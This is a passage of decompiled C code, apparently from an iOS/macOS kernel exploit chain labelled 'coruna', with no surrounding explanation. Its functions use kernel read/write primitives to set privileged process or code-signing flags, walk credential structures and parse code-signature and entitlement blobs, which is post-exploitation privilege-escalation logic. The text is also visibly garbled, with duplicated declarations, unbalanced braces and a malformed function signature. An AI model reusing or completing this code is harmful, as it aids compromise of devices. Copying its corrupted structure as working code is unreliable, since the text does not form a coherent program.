                (void *)((long)ptr + ((unsigned long)(tag >> 0x10 | tag << 0x10) - (unsigned long)u)),
                (unsigned long)(((version >> 0x10 | version << 0x10) + u) - (port >> 0x10 | port << 0x10))
               );
        u = (*(uint *)((long)ptr + 0x14) & 0xff00ff00) >> 8 |
                (*(uint *)((long)ptr + 0x14) & 0xff00ff) << 8;
        size = (*(uint *)((long)ptr + 0x10) & 0xff00ff00) >> 8 |
                (*(uint *)((long)ptr + 0x10) & 0xff00ff) << 8;
        size = size >> 0x10 | size << 0x10;
        if (size < (u >> 0x10 | u << 0x10)) {
          u = (*(uint *)((long)buf + 0x14) & 0xff00ff00) >> 8 |
                  (*(uint *)((long)buf + 0x14) & 0xff00ff) << 8;
          u = (u >> 0x10 | u << 0x10) + status;
          u = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
          *(uint *)((long)buf + 0x14) = u >> 0x10 | u << 0x10;
        }
        u = (*(uint *)((long)ptr + 8) & 0xff00ff00) >> 8 |
                (*(uint *)((long)ptr + 8) & 0xff00ff) << 8;
        u = u >> 0x10 | u << 0x10;
        if (0x200 < u >> 8) {
          tag = (*(uint *)((long)ptr + 0x2c) & 0xff00ff00) >> 8 |
                  (*(uint *)((long)ptr + 0x2c) & 0xff00ff) << 8;
          if (size < (tag >> 0x10 | tag << 0x10)) {
            tag = (*(uint *)((long)buf + 0x2c) & 0xff00ff00) >> 8 |
                    (*(uint *)((long)buf + 0x2c) & 0xff00ff) << 8;
            tag = (tag >> 0x10 | tag << 0x10) + status;
            tag = (tag & 0xff00ff00) >> 8 | (tag & 0xff00ff) << 8;
            *(uint *)((long)buf + 0x2c) = tag >> 0x10 | tag << 0x10;
          }
          if (0x201ff < u) {
            tag = (*(uint *)((long)ptr + 0x30) & 0xff00ff00) >> 8 |
                    (*(uint *)((long)ptr + 0x30) & 0xff00ff) << 8;
            if (size < (tag >> 0x10 | tag << 0x10)) {
              tag = (*(uint *)((long)buf + 0x30) & 0xff00ff00) >> 8 |
                      (*(uint *)((long)buf + 0x30) & 0xff00ff) << 8;
              tag = (tag >> 0x10 | tag << 0x10) + status;
              tag = (tag & 0xff00ff00) >> 8 | (tag & 0xff00ff) << 8;
              *(uint *)((long)buf + 0x30) = tag >> 0x10 | tag << 0x10;
            }
            if (0x204ff < u) {
              tag = (*(uint *)((long)ptr + 0x5c) & 0xff00ff00) >> 8 |
                      (*(uint *)((long)ptr + 0x5c) & 0xff00ff) << 8;
              if (size < (tag >> 0x10 | tag << 0x10)) {
                tag = (*(uint *)((long)buf + 0x5c) & 0xff00ff00) >> 8 |
                        (*(uint *)((long)buf + 0x5c) & 0xff00ff) << 8;
                tag = (tag >> 0x10 | tag << 0x10) + status;
                tag = (tag & 0xff00ff00) >> 8 | (tag & 0xff00ff) << 8;
                *(uint *)((long)buf + 0x5c) = tag >> 0x10 | tag << 0x10;
              }
              if ((0x205ff < u) &&
                 (u = (*(uint *)((long)ptr + 100) & 0xff00ff00) >> 8 |
                          (*(uint *)((long)ptr + 100) & 0xff00ff) << 8,
                 size < (u >> 0x10 | u << 0x10))) {
                u = (*(uint *)((long)buf + 100) & 0xff00ff00) >> 8 |
                        (*(uint *)((long)buf + 100) & 0xff00ff) << 8;
                u = (u >> 0x10 | u << 0x10) + status;
                u = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
                *(uint *)((long)buf + 100) = u >> 0x10 | u << 0x10;
              }
            }
          }
        }
        kind = coruna_kernel6544_via_memcpy_24a7c(handle,*(uint32_t *)(handle + 0x40),buf);
        _free(buf);
      }
    }
    else {
      kind = 1;
    }
  }
  return kind;
}





uint64_t coruna_return_zero_26090(long handle,uint64_t val)
{
  bool err;
  int err;
  long handle;
  uint64_t u;
  long addr;
  long off;
  unsigned long size;
  long base;
  long ctx_val;
  char scratch;
  
  scratch = '\0';
  u = 1;
  err = coruna_ctx_test_flag(handle,0x5184201);
  if (err != 0) {
    do {
    handle = coruna_kernel6544_via_return_zero_2019c(handle,val);
    if (handle == 0) {
      return 0;
    }
    err = coruna_ctx_test_flag(handle,0x20);
    if (err == 0) {
      err = coruna_ctx_test_flag(handle,0x5184001);
      if (err == 0) {
        u = coruna_ctx_test_flag(handle,0x200);
        if ((int)u == 0) {
          return u;
        }
        err = *(int *)(handle + 0x140);
        if (err < 0x1809) break;
        if (err < 0x2258) {
          if (err < 0x1f53) {
            if (err < 0x1c1b) {
              off = 0xe7;
              if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
                off = 0xef;
              }
            }
            else {
              off = 0xdf;
            }
          }
          else {
            off = 0x97;
          }
        }
        else {
          off = 0x8f;
        }
        off = handle + 0x92;
        u = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,off,1,&scratch);
        if ((int)u == 0) {
          return u;
        }
        if (scratch != '\0') {
          break;
        }
        u = 0;
        break;
      }
      err = *(int *)(handle + 0x140);
      if (err < 0x2712) {
        if (0x2257 < err) {
          err = coruna_ctx_test_flag(handle,0x1180000);
          err = err == 0;
          ctx_val = 0xb9;
          if (!err) {
            ctx_val = 0xc1;
          }
          base = 0xba;
          if (!err) {
            base = 0xc2;
          }
          addr = 0xbf;
          off = 0xb7;
          if (!err) {
          off = addr;
          }
          }
          off = off + handle;
          err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,off,1,&scratch);
          if (err == 0) {
          return 0;
        }
        if (0x1f52 < err) {
          u = 0x180000;
          err = coruna_ctx_test_flag(handle,u);
          err = err == 0;
          ctx_val = 0xc1;
          if (!err) {
          ctx_val = 0xc9;
          }
          base = 0xc2;
          if (!err) {
          base = 0xca;
          }
          addr = 199;
          off = 0xbf;
          if (!err) {
          off = addr;
          }
          }
          off = off + handle;
          err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,off,1,&scratch);
          if (err == 0) {
          return 0;
        }
        size = *(unsigned long *)(handle + 0x158);
        if (0x1c1b0a800fffff < size) {
          err = coruna_ctx_test_flag(handle,0x80000);
          err = err == 0;
          ctx_val = 0x101;
          if (!err) {
            ctx_val = 0x109;
          }
          off = 0x10a;
          base = 0x102;
          if (!err) {
            base = off;
          }
          addr = 0x107;
          off = 0xff;
          if (!err) {
          off = addr;
          }
          }
          off = off + handle;
          err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,off,1,&scratch);
          if (err == 0) {
          return 0;
        }
        if (0x1c1a < err) {
          err = coruna_ctx_test_flag(handle,0x80000);
          err = err == 0;
          ctx_val = 0x100;
          if (!err) {
            ctx_val = 0x108;
          }
          off = 0x109;
          base = 0x101;
          if (!err) {
            base = off;
          }
          addr = 0x107;
          off = 0xff;
          if (!err) {
            off = addr;
          }
        }
        else {
        ctx_val = 0x108;
        if (size < 0x18090a07900000) {
          ctx_val = 0x110;
        }
        base = 0x109;
        if (size < 0x18090a07900000) {
          base = 0x111;
        }
        off = 0x107;
        if (size < 0x18090a07900000) {
          off = 0x10f;
        }
      }
      else {
        u = 0x1180000;
check_ok:
        err = coruna_ctx_test_flag(handle,u);
        err = err == 0;
        ctx_val = 0xc1;
        if (!err) {
          ctx_val = 0xc9;
        }
        base = 0xc2;
        if (!err) {
          base = 0xca;
        }
        addr = 199;
        off = 0xbf;
cleanup:
        if (!err) {
          off = addr;
        }
      }
      off = off + handle;
      err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,off,1,&scratch);
      if (err == 0) {
        return 0;
      }
      if (scratch == '\0') {
        return 0;
      }
      u = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,ctx_val + handle,1,&scratch);
      if ((int)u == 0) {
        return u;
      }
      if (scratch == '\0') break;
      u = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,base + handle,1,&scratch);
      if ((int)u == 0) {
        return u;
      }
      if (scratch != '\0') {
        off = handle + 0x92;
        u = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,off,1,&scratch);
        if ((int)u == 0) {
          return u;
        }
        if (scratch != '\0') {
          break;
        }
      }
    }
    }
    else {
      off = handle + 0x92;
      u = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,off,1,&scratch);
      if ((int)u == 0) {
        return u;
      }
      if (scratch != '\0') {
        break;
      }
    }
    u = 0;
    } while (0);
  }
  return u;
}





unsigned long coruna_return_zero_2639c(long arg,uint64_t val)

{
  bool i;
  int flags;
  long serial_10;
  unsigned long size;
  uint64_t version;
  long serial_14;
  long serial_12;
  long serial_13;
  char cache_89;
  long cache;
  char cache_90;
  
  cache_90 = '\0';
  flags = coruna_ctx_test_flag(arg,0x5184001);
  if (flags == 0) {
load_ok_67:
    size = 1;
  }
  else {
    serial_10 = coruna_kernel6544_via_return_zero_2c3b8_2(arg,val);
    if (serial_10 == 0) {
      return 0;
    }
    flags = coruna_ctx_test_flag(arg,0x20);
    if (flags == 0) {
      flags = *(int *)(arg + 0x140);
      if (flags < 0x2712) {
        if (0x2257 < flags) {
          flags = coruna_ctx_test_flag(arg,0x1180000);
          i = flags == 0;
          serial_14 = 0xb9;
          if (!i) {
            serial_14 = 0xc1;
          }
          serial_12 = 0xc2;
          serial_13 = 0xba;
          if (!i) {
          serial_13 = serial_12;
          }
          }
          size = coruna_nop_stub_6(arg,serial_14 + serial_10,1,&cache_90);
          if ((int)size == 0) {
          return size;
        }
        if (0x1f52 < flags) {
          version = 0x180000;
          flags = coruna_ctx_test_flag(arg,version);
          i = flags == 0;
          serial_14 = 0xc1;
          if (!i) {
          serial_14 = 0xc9;
          }
          serial_12 = 0xca;
          serial_13 = 0xc2;
          if (!i) {
          serial_13 = serial_12;
          }
          }
          size = coruna_nop_stub_6(arg,serial_14 + serial_10,1,&cache_90);
          if ((int)size == 0) {
          return size;
        }
        size = *(unsigned long *)(arg + 0x158);
        if (0x1c1b0a800fffff < size) {
          flags = coruna_ctx_test_flag(arg,0x80000);
          i = flags == 0;
          serial_14 = 0x101;
          if (!i) {
            serial_14 = 0x109;
          }
          serial_12 = 0x10a;
          serial_13 = 0x102;
          if (!i) {
          serial_13 = serial_12;
          }
          }
          size = coruna_nop_stub_6(arg,serial_14 + serial_10,1,&cache_90);
          if ((int)size == 0) {
          return size;
        }
        if (0x1c1a < flags) {
          flags = coruna_ctx_test_flag(arg,0x80000);
          i = flags == 0;
          serial_14 = 0x100;
          if (!i) {
            serial_14 = 0x108;
          }
          serial_12 = 0x109;
          serial_13 = 0x101;
          if (!i) {
          serial_13 = serial_12;
          }
          }
          size = coruna_nop_stub_6(arg,serial_14 + serial_10,1,&cache_90);
          if ((int)size == 0) {
          return size;
        }
        serial_14 = 0x108;
        if (size < 0x18090a07900000) {
          serial_14 = 0x110;
        }
        serial_13 = 0x109;
        if (size < 0x18090a07900000) {
          serial_13 = 0x111;
        }
      }
      else {
        version = 0x1180000;
load_ok_69:
        flags = coruna_ctx_test_flag(arg,version);
        i = flags == 0;
        serial_14 = 0xc1;
        if (!i) {
          serial_14 = 0xc9;
        }
        serial_12 = 0xca;
        serial_13 = 0xc2;
load_ok_68:
        if (!i) {
          serial_13 = serial_12;
        }
      }
      size = coruna_nop_stub_6(arg,serial_14 + serial_10,1,&cache_90);
      if ((int)size == 0) {
        return size;
      }
      if (cache_90 == '\0') goto load_ok_67;
      size = coruna_nop_stub_6(arg,serial_13 + serial_10,1,&cache_90);
      flags = (int)size;
    }
    else {
      size = coruna_kernel6544_residual_256(arg,serial_10 + 0xb0,&cache);
      if ((int)size == 0) {
        return size;
      }
      serial_10 = coruna_ptr_canonicalize(arg,cache);
      if (serial_10 == 0) {
        return 0;
      }
      size = coruna_nop_stub_6(arg,cache + 0x20,1,&cache_89);
      flags = (int)size;
      cache_90 = cache_89;
    }
    if (flags != 0) {
      size = (unsigned long)(cache_90 != '\0');
    }
  }
  return size;
}





unsigned long coruna_kernel6544_via_return_zero_2cd88(uint64_t arg)

{
  int count;
  long serial_7;
  unsigned long u;
  uint cache_40;
  
  serial_7 = coruna_return_zero_2cd88();
  u = 0;
  if ((serial_7 != 0) && (u = coruna_kernel6544_via_fcntl_1bf84(arg,serial_7,&cache_40), (int)u != 0)) {
    if ((cache_40 & 1) == 0) {
      count = coruna_kernel6544_via_mach_vm_machine_attribute(arg,serial_7,cache_40 | 1);
      u = (unsigned long)(count != 0);
    }
    else {
      u = 1;
    }
  }
  return u;
}





unsigned long coruna_kernel6544_via_kernel6544_via_fcntl_1bf84(long arg,uint64_t val,int n)

{
  uint type_id_13;
  bool err;
  unsigned long u;
  long base;
  uint version;
  uint cache_33;
  
  u = coruna_return_zero_2639c();
  if ((((int)u != 0) && (base = coruna_return_zero_2cd88(arg,val), u = 0, base != 0)) &&
     (u = coruna_kernel6544_via_fcntl_1bf84(arg,base,&cache_33), (int)u != 0)) {
    version = 0x10000001;
    if (n == 0) {
      version = 0x301;
    }
    version = version | cache_33 & 0xeffffcfe;
    err = version == cache_33;
    cache_33 = version;
    if (((err) || (u = coruna_kernel6544_via_mach_vm_machine_attribute(arg,base), (int)u != 0)) &&
       ((base = coruna_return_zero_2c3b8(arg,val), u = 0, base != 0 &&
        (u = coruna_iosurface_cred_walk(arg), (int)u != 0)))) {
      base = base + (u & 0xffffffff);
      u = coruna_kernel6544_via_fcntl_1bf84(arg,base,&cache_33);
      if ((int)u != 0) {
        version = 0x8010;
        if (*(unsigned long *)(arg + 0x158) < 0x1c1b1e02600000) {
          version = 0x10;
        }
        type_id_13 = cache_33 & (version ^ 0xffffffff);
        if (n == 0) {
          type_id_13 = version | cache_33;
        }
        if ((type_id_13 == cache_33) ||
           (cache_33 = type_id_13, u = coruna_mach_vm_machine_attribute(arg,base), (int)u != 0)) {
          u = 1;
        }
      }
    }
  }
  return u;
}





void coruna_kernel6544_via_kernel6544_via_kernel09_via_bzero_2(uint *size,uint64_t val)
{
  unsigned long *ptr;
  int err;
  long handle;
  uint64_t u;
  uint64_t scratch;
  long bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t host_info;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t serial_buf;
  long action;
  uint block_ctx;
  uint8_t stack_guard[8];
  long sa_saved;
  long sa_new;
  unsigned long path_buf;
  uint64_t tmp_buf;
  uint64_t sa_saved;
  uint64_t sa_new;
  unsigned long region [23];
  
  region[0x16] = *(unsigned long *)k_kernel_stack_chk_guard_slot;
  handle = coruna_call_macho_data_seg_2bb24_2bdb4_20fac(size,val,&block_ctx);
  u = 0;
  if ((handle == 0) ||
     (((block_ctx >> 10 & 1) == 0 &&
      if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
      return;
      }
      ___stack_chk_fail(u);
  if ((0x22580a06bfffff < *(unsigned long *)(size + 0x56)) ||
     ((0x1f543c407fffff < *(unsigned long *)(size + 0x56) && ((int)size[0x50] < 0x2258)))) {
    handle = coruna_return_zero_2d664(size,val,1,&block_ctx);
    u = 0;
    if ((handle == 0) ||
       (((block_ctx >> 10 & 1) == 0 &&
        (u = coruna_kernel6544_via_mach_vm_machine_attribute(size,handle,block_ctx | 0x400), (int)u == 0))))
    if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
    return;
    }
    ___stack_chk_fail(u);
  }
  u = coruna_plist_dict_24a54(size,val,stack_guard);
  if (((int)u == 0) || (u = coruna_kernel6544_via_nop_stub_6_6(size,stack_guard), (int)u == 0))
  if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
  return;
  }
  ___stack_chk_fail(u);
  if ((*(unsigned long *)(size + 0x56) < 0x1c1b1914600000) ||
     (((*size & 0x5584001) == 0 && (*(unsigned long *)(size + 0x56) < 0x1f530000000000)))) {
done:
    coruna_kernel6544_via_kernel09_via_bzero_2(stack_guard);
    u = coruna_return_zero_26c3c(size,val,&scratch);
    if (((int)u == 0) ||
       (u = coruna_return_zero_236bc(size,val,&scratch,0,stack_guard), (int)u == 0))
    if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
    return;
    }
    ___stack_chk_fail(u);
    handle = 0x58;
    if (*(unsigned long *)(size + 0x56) < 0x1f530f02800000) {
      handle = 0x48;
    }
    err = coruna_nop_stub_6(size,handle + sa_saved,0x14,&tmp_buf);
    if ((err != 0) && (err = coruna_kernel6544_via_kernel6544_via_kernel6544_via_nop_stub_7_3(size,&tmp_buf,0x14), err != 0)) {
      u = coruna_kernel6544_via_nop_stub_6_6(size,stack_guard);
      if ((int)u != 0) {
        coruna_kernel6544_via_kernel09_via_bzero_2(stack_guard);
        u = 1;
      }
      if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
      return;
      }
      ___stack_chk_fail(u);
    }
  }
  else if (sa_new != 0) {
    u = coruna_kernel6544_residual_256(size,sa_new,&action);
    if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
    return;
    }
    ___stack_chk_fail(u);
    if (action != 0) {
      do {
        region[0x15] = 0;
        region[0x12] = 0;
        region[0x11] = 0;
        region[0x14] = 0;
        region[0x13] = 0;
        region[0xe] = 0;
        region[0xd] = 0;
        region[0x10] = 0;
        region[0xf] = 0;
        region[10] = 0;
        region[9] = 0;
        region[0xc] = 0;
        region[0xb] = 0;
        region[6] = 0;
        region[5] = 0;
        region[8] = 0;
        region[7] = 0;
        region[2] = 0;
        region[1] = 0;
        region[4] = 0;
        region[3] = 0;
        u = 0x40;
        if (*(unsigned long *)(size + 0x56) < 0x1f530f02800000) {
          u = 0x30;
        }
        sa_saved = 0;
        tmp_buf = 0;
        region[0] = 0;
        sa_new = 0;
        err = coruna_nop_stub_6(size,action,u,&tmp_buf);
        u = 0;
        if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
        return;
        }
        ___stack_chk_fail(u);
        ptr = region + 2;
        if (*(unsigned long *)(size + 0x56) < 0x1f530f02800000) {
          ptr = region;
        }
        if (path_buf != *ptr && *ptr >> 0x1d != 0) {
          serial_buf = 0;
          action = 0;
          host_info = 0;
          stack_guard = 0;
          block_ctx = 0;
          thread_attr = 0;
          thread_attr = 0;
          serial_buf = 0;
          host_info = 0;
          scratch = 0;
          bootargs = 0;
          scratch = 0;
          bootargs = action;
          err = coruna_kernel6544_via_nop_stub_6_6(size,&scratch);
          u = 0;
          if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
          return;
          }
          ___stack_chk_fail(u);
        }
        u = coruna_kernel6544_residual_256(size,action,&action);
        if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
        return;
        }
        ___stack_chk_fail(u);
      } while (action != 0);
      {
        coruna_kernel6544_via_kernel09_via_bzero_2(stack_guard);
        u = coruna_return_zero_26c3c(size,val,&scratch);
        if (((int)u == 0) ||
        (u = coruna_return_zero_236bc(size,val,&scratch,0,stack_guard), (int)u == 0))
        if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
        return;
        }
        ___stack_chk_fail(u);
        handle = 0x58;
        if (*(unsigned long *)(size + 0x56) < 0x1f530f02800000) {
        handle = 0x48;
        }
        err = coruna_nop_stub_6(size,handle + sa_saved,0x14,&tmp_buf);
        if ((err != 0) && (err = coruna_kernel6544_via_kernel6544_via_kernel6544_via_nop_stub_7_3(size,&tmp_buf,0x14), err != 0)) {
        u = coruna_kernel6544_via_nop_stub_6_6(size,stack_guard);
        if ((int)u != 0) {
        coruna_kernel6544_via_kernel09_via_bzero_2(stack_guard);
        u = 1;
        }
        if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
        return;
        }
        ___stack_chk_fail(u);
        }
      }
    }
  }
cleanup:
  u = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
    return;
  }
  ___stack_chk_fail(u);
}





uint64_t coruna_kernel6544_via_nop_stub_6_6(long handle,uint *size)
{
  uint u;
  bool err;
  uint64_t size;
  unsigned long version;
  long handle;
  long scratch;
  uint bootargs;
  uint thread_attr;
  
  thread_attr = 1;
  version = *(unsigned long *)(handle + 0x158);
  if (version < 0x1f530f02800000) {
    if (version < 0x1f530000000000) {
      if (version < 0x1c1b1914600000) {
        handle = 0xa0;
        if (*(int *)(handle + 0x140) < 0x1c1b) {
          handle = 0xa8;
        }
      }
      else {
        handle = 0xa8;
      }
    }
    else {
      handle = 0xb8;
    }
  }
  else {
    handle = 0xac;
  }
  size = coruna_nop_stub_6(handle,*(long *)(size + 2) + handle,1,&thread_attr);
  if ((int)size != 0) {
    if ((thread_attr & 1) == 0) {
      thread_attr = thread_attr | 1;
      size = coruna_kernel6544_via_vm_deallocate_f7f8(handle,*(long *)(size + 2) + handle,&thread_attr,1);
      if ((int)size == 0) {
        return size;
      }
    }
    handle = 0x20;
    if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
      handle = 0x10;
    }
    size = coruna_nop_stub_6(handle,handle + *(long *)(size + 2),4,&bootargs);
    if ((int)size != 0) {
      if (((bootargs ^ 0xffffffff) & 0x4004000) != 0) {
        u = 0x4000000;
        if (*(int *)(handle + 0x140) < 0x1c1b) {
          u = 0x4004000;
        }
        u = u | bootargs;
        err = u != bootargs;
        bootargs = u;
        if (err) {
          size = coruna_kernel6544_via_vm_deallocate_f7f8(handle,*(long *)(size + 2) + handle,&bootargs,4);
          if ((int)size == 0) {
            return size;
          }
          *size = bootargs;
        }
      }
      handle = 0x88;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        handle = 0x80;
      }
      size = coruna_kernel6544_residual_256(handle,handle + *(long *)(size + 2),&scratch);
      if (((int)size != 0) &&
         ((scratch == 0 ||
          (size = coruna_kernel6544_via_mach_vm_machine_attribute_29df8(handle,*(long *)(size + 2) + handle,0), (int)size != 0)))) {
        size[0x14] = 0;
        size = 1;
      }
    }
  }
  return size;
}





uint64_t coruna_return_zero_26c3c(uint64_t val,uint64_t id_2,unsigned long *arg)
{
  int err;
  long handle;
  long addr;
  uint64_t u;
  unsigned long scratch;
  uint bootargs;
  uint8_t thread_attr[4];
  unsigned long host_info;
  
  host_info = 0;
  handle = coruna_ret_stub_3();
  u = 0;
  if (handle != 0) {
    addr = coruna_return_zero_2b0c0(val,handle);
    u = 0;
    if ((addr != 0) && (u = coruna_kernel6544_residual_256(val,addr,&host_info), (int)u != 0)) {
      if (((uint)host_info >> 2 & 1) == 0) {
        handle = coruna_return_zero_2b000(val,handle);
        if ((((handle == 0) || (handle = coruna_return_zero_2ba0c(val,handle), handle == 0)) ||
            (err = coruna_return_zero_24300(val,thread_attr,&bootargs), err == 0)) ||
           (err = coruna_nop_stub_6(val,handle + (unsigned long)bootargs,8,&scratch), err == 0)) {
          return 0;
        }
      }
      else {
        scratch = host_info & 0xfffffffffffff000;
      }
      *arg = scratch;
      u = 1;
    }
  }
  return u;
}





uint64_t
void coruna_return_zero_236bc(uint *size,uint flags_2,uint64_t val,uint64_t id_2,uint *count_3)
{
  long handle;
  long addr;
  long off;
  long base;
  long ctx_val;
  long serial;
  long serial_7;
  uint u;
  int err;
  long serial_8;
  int *err;
  int *status;
  uint *ptr;
  uint *buf;
  void *ptr;
  uint size;
  uint *str;
  uint *copy;
  unsigned long version;
  uint64_t *data;
  uint *obj;
  size_t ls22;
  uint64_t port;
  uint tag;
  uint kind;
  uint type_id;
  uint *scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long host_info;
  long serial_buf;
  long action;
  long block_ctx;
  size_t stack_guard;
  long sa_saved;
  uint sa_new;
  
  sa_new = 0;
  stack_guard = 0;
  sa_saved = 0;
  action = 0;
  block_ctx = 0;
  host_info = 0;
  serial_buf = 0;
  bootargs = 0;
  thread_attr = 0;
  if ((count_3 == (uint *)0x0) || (serial_8 = coruna_kernel6544_via_nop_stub_6_5(), serial_8 == 0)) {
    return 0;
  }
  version = *(unsigned long *)(size + 0x56);
  handle = 0x40;
  if (version < 0x1f530f02800000) {
    handle = 0x30;
  }
  addr = 0x50;
  if (version < 0x1f530f02800000) {
    addr = 0x40;
  }
  off = 0x20;
  if (version < 0x1f530f02800000) {
    off = 0x10;
  }
  base = 0x80;
  if (version < 0x1f530f02800000) {
    base = 0x78;
  }
  ctx_val = 0x88;
  if (version < 0x1f530f02800000) {
    ctx_val = 0x80;
  }
  serial = 0x90;
  if (version < 0x1f530f02800000) {
    serial = 0x88;
  }
  serial_7 = 0x28;
  if (version < 0x1f530f02800000) {
    serial_7 = 0x18;
  }
  err = coruna_kernel6544_residual_256(size,serial + serial_8,&serial_buf);
  if (err == 0) {
    return 0;
  }
  if ((0x1f52ffffffffff < *(unsigned long *)(size + 0x56)) &&
     (err = coruna_kernel6544_residual_256(size,serial_8 + 0x98,&host_info), err == 0)) {
    return 0;
  }
  err = coruna_kernel6544_residual_256(size,base + serial_8,&block_ctx);
  if (err == 0) {
    return 0;
  }
  err = coruna_kernel6544_residual_256(size,ctx_val + serial_8,&action);
  if (err == 0) {
    return 0;
  }
  err = coruna_kernel6544_via_fcntl_1bf84(size,off + serial_8,&sa_new);
  if (err == 0) {
    return 0;
  }
  if ((sa_new & 1) == 0) {
    return 0;
  }
  err = coruna_kernel6544_residual_256(size,handle + serial_8,&stack_guard);
  if (err == 0) {
    return 0;
  }
  err = coruna_kernel6544_residual_256(size,addr + serial_8,&sa_saved);
  if (err == 0) {
    return 0;
  }
  if (sa_saved == 0) {
    return 0;
  }
  if (stack_guard == 0) {
    return 0;
  }
  err = coruna_nop_stub_6(size,serial_7 + serial_8,8,&bootargs);
  if (err == 0) {
    return 0;
  }
  err = _malloc(stack_guard);
  if (err == (int *)0x0) {
    return 0;
  }
  count_3[0x18] = 0;
  count_3[0x19] = 0;
  count_3[0x12] = 0;
  count_3[0x13] = 0;
  count_3[0x10] = 0;
  count_3[0x11] = 0;
  count_3[0x16] = 0;
  count_3[0x17] = 0;
  count_3[0x14] = 0;
  count_3[0x15] = 0;
  count_3[10] = 0;
  count_3[0xb] = 0;
  count_3[8] = 0;
  count_3[9] = 0;
  count_3[0xe] = 0;
  count_3[0xf] = 0;
  count_3[0xc] = 0;
  count_3[0xd] = 0;
  count_3[2] = 0;
  count_3[3] = 0;
  count_3[0] = 0;
  count_3[1] = 0;
  count_3[6] = 0;
  count_3[7] = 0;
  count_3[4] = 0;
  count_3[5] = 0;
  err = coruna_nop_stub_6(size,sa_saved,stack_guard,err);
  if (err != 0) {
    *count_3 = sa_new;
    *(long *)(count_3 + 2) = serial_8;
    *(size_t *)(count_3 + 4) = stack_guard;
    *(long *)(count_3 + 6) = sa_saved;
    *(uint64_t *)(count_3 + 8) = thread_attr;
    *(uint64_t *)(count_3 + 10) = bootargs;
    count_3[0x11] = flags_2;
    err = (int)sa_saved;
    size = 0;
    if (block_ctx != 0) {
      size = (int)block_ctx - err;
    }
    count_3[0x13] = size;
    if (size < stack_guard) {
      tag = 0;
      if (action != 0) {
        tag = (int)action - err;
      }
      count_3[0x14] = tag;
      if (((tag == 0) || (tag < stack_guard)) ||
         (((*size & 0x5584001) == 0 && (*(unsigned long *)(size + 0x56) < 0x1f530000000000)))) {
        tag = 0;
        if (serial_buf != 0) {
          tag = (int)serial_buf - err;
        }
        count_3[0x15] = tag;
        if ((tag == 0) || (tag < stack_guard)) {
          tag = 0;
          if (host_info != 0) {
            tag = (int)host_info - err;
          }
          count_3[0x16] = tag;
          if ((tag == 0) || (tag < stack_guard)) {
            if (*err == 0x20cdefa) {
              scratch = (uint *)coruna_malloc();
              coruna_kernel6544_via_kernel09_via_bzero_2(count_3);
              port = 0;
              status = (int *)coruna_memcpy_24a7c(err);
              if (status != (int *)0x0) {
                err = coruna_iokit_msg_append(scratch,0,status);
                if (err != -1) {
                  tag = 0;
                  size = 0;
                  count_3[0xc] = 1;
                  *(uint **)(count_3 + 0xe) = scratch;
                  count_3[0x10] = 0;
                  {
                    count_3[0x17] = tag;
                    serial_8 = coruna_wire_map_lookup(count_3,size,0xfade0c02);
                    if ((serial_8 != 0) &&
                    ((((count_3[0x12] = (uint)*(byte *)(serial_8 + 0x24),
                    *(unsigned long *)(size + 0x56) < 0x1f530000000000 ||
                    (serial_8 = coruna_wire_map_lookup(count_3,7,0xfade7172), serial_8 == 0)) ||
                    (serial_8 = coruna_wire_map_lookup(count_3,5,0xfade7171), serial_8 != 0)) ||
                    (err = coruna_kernel6544_via_wire_map_lookup(count_3,5,0xfade7171), err != 0)))) {
                    port = 1;
                    _free(err);
                    return port;
                    }
                  }
                }
cleanup:
                coruna_bzero(status);
              }
check_ok:
              coruna_kernel09_via_bzero_2(scratch);
            }
            else {
              if ((*err != -0x3ff32106) ||
                 coruna_kernel6544_via_kernel09_via_bzero_2(count_3);
                 port = 0;
              tag = err[2];
              if (tag == 0) {
                tag = 0xfffffffe;
              }
              else {
                tag = (tag & 0xff00ff00) >> 8 | (tag & 0xff00ff) << 8;
                version = (unsigned long)(tag >> 0x10 | tag << 0x10);
                ptr = (uint *)(err + 4);
                tag = 0;
                do {
                  u = ptr[-1];
                  kind = (*ptr & 0xff00ff00) >> 8 | (*ptr & 0xff00ff) << 8;
                  type_id = kind >> 0x10 | kind << 0x10;
                  kind = type_id;
                  if (tag <= type_id && tag != 0) {
                    kind = tag;
                  }
                  status = (int *)coruna_memcpy_24a7c((long)err + (unsigned long)type_id);
                  if (status == (int *)0x0) goto check_ok;
                  tag = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
                  tag = tag >> 0x10 | tag << 0x10;
                  err = coruna_iokit_msg_append(scratch,tag,status);
                  if (err == -1) goto cleanup;
                  if (*status == 0x20cdefa) {
                    if (size == 0) {
                      if (u == 0) {
                        tag = 0;
                        goto skip;
                      }
                    }
                    else if (type_id == size) {
skip:
                      count_3[0x10] = tag;
                    }
                  }
                  ptr = ptr + 2;
                  version = version - 1;
                  tag = kind;
